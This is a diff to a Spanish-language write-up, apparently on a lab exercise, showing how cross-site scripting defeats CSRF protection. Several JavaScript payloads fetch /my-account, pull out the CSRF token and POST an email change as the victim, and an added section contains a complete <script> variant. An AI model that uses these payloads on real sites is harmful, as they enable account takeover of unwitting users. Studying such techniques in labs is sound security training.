@@ -41,14 +41,10 @@ Este enfoque funciona porque el XSS ejecuta JavaScript en el contexto del origen
         const csrf = doc.querySelector('input[name="csrf"]').value;
 
         // 2) Enviar el cambio de email con application/x-www-form-urlencoded
-        const body = 'csrf=' + encodeURIComponent(csrf) +
-                                 '&email=' + encodeURIComponent('test@test.com');
-
+        const body = 'csrf=' + encodeURIComponent(csrf) + '&email=' + encodeURIComponent('test@test.com');
         await fetch('/my-account/change-email', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-            body,
-            credentials: 'include'
+            method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body, credentials: 'include'
         });
     } catch (e) {
         console.log('XSS CSRF bypass error:', e);
@@ -93,9 +89,7 @@ try {
         if (!m) return;
         var csrf = m[1];
 
-        var body = 'email=' + encodeURIComponent('hacked@mail.com') +
-                             '&csrf=' + encodeURIComponent(csrf);
-
+        var body = 'email=' + encodeURIComponent('hacked@mail.com') + '&csrf=' + encodeURIComponent(csrf);
         var req2 = new XMLHttpRequest();
         req2.open('POST', '/my-account/change-email', true);
         req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
@@ -121,6 +115,23 @@ try {
 ```
 
 Con el token recibido en tu servidor, puedes completar manualmente la petición `POST` o automatizarla desde tu infraestructura.
+
+### C) Variante sin manejo de errores
+
+```js
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com')
+};
+</script>
+```
 
 ---
 
